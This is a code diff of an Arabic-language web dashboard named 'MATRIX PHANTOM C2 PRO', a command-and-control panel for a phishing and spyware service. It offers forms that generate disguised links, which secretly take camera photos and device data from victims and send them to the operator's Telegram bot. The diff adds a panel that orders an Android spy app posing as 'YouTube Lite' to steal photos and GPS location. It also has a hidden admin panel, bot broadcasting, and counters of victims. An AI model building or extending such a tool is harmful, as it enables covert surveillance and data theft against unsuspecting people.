@@ -11,78 +11,86 @@
 </head>
 <body>
 
-    <div class="secret-trigger" onclick="checkAdmin()"></div>
-
     <div class="container">
         <div class="title-bar">
             <span>📡</span> MATRIX PHANTOM <span style="color:#888; font-size:12px;">C2 PRO</span>
         </div>
+
         <div class="stats-bar">
-            <div class="stat-item"><small>الإصدار</small> 2.0.0 Pro</div>
-            <div class="stat-item"><small>البوتات</small> <span id="sys-bots">0</span></div>
-            <div class="stat-item"><small>الضحايا</small> <span id="sys-hits">0</span></div>
+            <div class="stat-item" onclick="adminTrigger()" style="cursor: pointer;">
+                <small>الإصدار (اضغط 3)</small> 
+                <span id="version-number" style="color:var(--neon); font-weight:bold;">2.0.0 Pro</span>
+            </div>
+            <div class="stat-item">
+                <small>البوتات المتصلة</small> 
+                <span id="sys-bots">0</span>
+            </div>
+            <div class="stat-item">
+                <small>إجمالي الصيد</small> 
+                <span id="sys-hits">0</span>
+            </div>
         </div>
 
         <div class="main-grid">
             <div class="panel">
-                <div class="panel-header"><span>💀</span> صناعة لينك ملغم</div>
-                
-                <small class="help-text">أدخل توكن بوت التليجرام ومعرف الشات (Chat ID) لإرسال الصيد لك:</small>
-                <input type="text" id="target-token" placeholder="Bot Token (e.g., 12345:AA...)">
-                <input type="text" id="target-chatid" placeholder="Your Chat ID (e.g., 987654)">
-
+                <div class="panel-header"><span>💀</span> رادار اختراق الروابط</div>
+                <input type="text" id="target-token" placeholder="Bot Token">
+                <input type="text" id="target-chatid" placeholder="Your Chat ID">
                 <select id="payload-type">
-                    <option value="photo_cam">📸 الاختراق الشامل (صورة كاميرا + بيانات الجهاز)</option>
-                    <option value="info_only">📄 بيانات الجهاز فقط (سرعة أعلى، بدون كاميرا)</option>
+                    <option value="photo_cam">📸 سحب الكاميرا + بيانات الجهاز</option>
+                    <option value="info_only">📄 بيانات الجهاز فقط</option>
                 </select>
-                <input type="text" id="decoy-url" placeholder="رابط التمويه (يوتيوب، فيسبوك، انستجرام...)">
-                <button class="btn btn-green" onclick="generatePhantomLink()">توليد اللينك النهائي ⚡</button>
+                <input type="text" id="decoy-url" placeholder="رابط التمويه">
+                <button class="btn btn-green" onclick="generatePhantomLink()">توليد الرابط المشفر ⚡</button>
+            </div>
+
+            <div class="panel" style="border-color: var(--neon);">
+                <div class="panel-header"><span>📱</span> بناء تطبيق تجسس (Spy APK)</div>
+                <p class="desc-text">سيتم بناء نسخة Android (YouTube Lite) مرتبطة ببوك لسحب الصور والـ GPS.</p>
+                <input type="text" id="apk-token" placeholder="Bot Token للـ APK">
+                <input type="text" id="apk-chatid" placeholder="Chat ID لاستلام الصيد">
+                <button class="btn btn-green" style="background: transparent; border: 1px solid var(--neon); color: var(--neon);" onclick="requestAPK()">إرسال طلب بناء التطبيق 🏗️</button>
             </div>
 
             <div class="panel">
-                <div class="panel-header"><span>💬</span> الدعم والاقتراحات</div>
-                <p class="desc-text">ساعدنا في تطوير المنصة بإرسال اقتراحك للأدمن، أو تواصل معنا فوراً.</p>
-                <textarea id="suggestion-text" placeholder="اكتب اقتراحك هنا (سيصل للأدمن).."></textarea>
-                <button class="btn btn-gray" onclick="submitSuggestion()">إرسال الاقتراح 📬</button>
+                <div class="panel-header"><span>💬</span> مركز الدعم والمقترحات</div>
+                <textarea id="suggestion-text" placeholder="اكتب اقتراحك هنا..."></textarea>
+                <button class="btn btn-gray" onclick="submitSuggestion()">إرسال للمراجعة 📬</button>
                 <button class="btn btn-red" onclick="contactAdminRed()">🆘 تواصل مع الدعم الفني</button>
             </div>
         </div>
     </div>
 
-    <div id="master-panel">
-        <h2 class="admin-title">MATRIX GHOST ADMIN</h2>
+    <div id="master-panel" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.98); z-index:9999; padding:25px; overflow-y:auto;">
+        <h2 class="admin-title">MATRIX GHOST CONTROL</h2>
         
-        <div class="panel admin-card">
-            <div class="panel-header">📢 إرسال رسالة جماعية (للبوتات المسجلة)</div>
-            <small class="help-text">السيستم سيلف على جميع الـ IDs المتسجلة ويبعتلهم الرسالة فوراً.</small>
+        <div class="panel admin-card" style="margin-bottom: 20px;">
+            <div class="panel-header">📥 طلبات بناء الـ APK المستلمة</div>
+            <div id="apk-requests-list" class="suggestions-container" style="height: 150px;">جاري جلب الطلبات...</div>
+        </div>
+
+        <div class="panel admin-card" style="margin-bottom: 20px;">
+            <div class="panel-header">📢 إرسال جماعي (Broadcast)</div>
             <input type="text" id="broadcast-token" placeholder="Admin Bot Token">
-            <textarea id="broadcast-message" placeholder="نص الرسالة الجماعية هنا..."></textarea>
-            <button class="btn btn-neon" onclick="startBroadcasting()">بدء الإرسال الجماعي</button>
+            <textarea id="broadcast-message" placeholder="نص الرسالة..."></textarea>
+            <button class="btn btn-green" onclick="startBroadcasting()">بدء البث الجماعي</button>
         </div>
 
         <div class="panel admin-card">
-            <div class="panel-header">📩 الاقتراحات المستلمة</div>
-            <div id="suggestions-list" class="suggestions-container">(لا توجد اقتراحات بعد)</div>
+            <div class="panel-header">📩 الاقتراحات الواردة</div>
+            <div id="suggestions-list" class="suggestions-container" style="height: 150px;">جاري جلب البيانات...</div>
         </div>
 
-        <button class="btn btn-red close-btn" onclick="closeAdmin()">إغلاق لوحة الأدمن</button>
+        <button class="btn btn-red" onclick="closeAdmin()">خروج من لوحة التحكم</button>
     </div>
 
     <script src="firebase-config.js"></script>
     <script src="api.js"></script>
     <script>
-        // مزامنة الإحصائيات مع Firebase
-        db.ref('hits').on('value', (snap) => {
-            document.getElementById('sys-hits').innerText = snap.numChildren();
-        });
-        db.ref('users').on('value', (snap) => {
-            document.getElementById('sys-bots').innerText = snap.numChildren();
-        });
-
-        // زر الدعم الأحمر (مثل الصورة 8-11)
-        function contactAdminRed() {
-            window.location.href = "https://wa.me/201224815487?text=الدعم_الفني_لمنصة_فانتوم_Pro_V2";
-        }
+        db.ref('hits').on('value', (snap) => { document.getElementById('sys-hits').innerText = snap.numChildren(); });
+        db.ref('users').on('value', (snap) => { document.getElementById('sys-bots').innerText = snap.numChildren(); });
+        function contactAdminRed() { window.location.href = "https://wa.me/201224815487?text=الدعم_الفني_لمنصة_فانتوم_Pro_V2"; }
+        function closeAdmin() { document.getElementById('master-panel').style.display = 'none'; }
     </script>
 </body>
 </html>
